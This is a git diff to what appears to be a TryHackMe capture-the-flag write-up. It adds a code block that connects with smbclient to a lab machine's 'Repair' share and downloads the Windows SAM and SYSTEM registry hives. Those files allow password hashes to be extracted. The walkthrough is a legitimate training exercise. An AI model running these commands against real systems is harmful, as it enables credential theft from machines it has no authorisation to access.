@@ -265,6 +265,13 @@ transfer the SAM and SYSTEM files to our machine
 
 ![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c715c4f7-7f5c-46cb-9b45-dc036341e29b)
 
+```
+smbclient //10.10.80.166/Repair
+ls
+get SAM
+get SYSTEM
+```
+
 
 
 
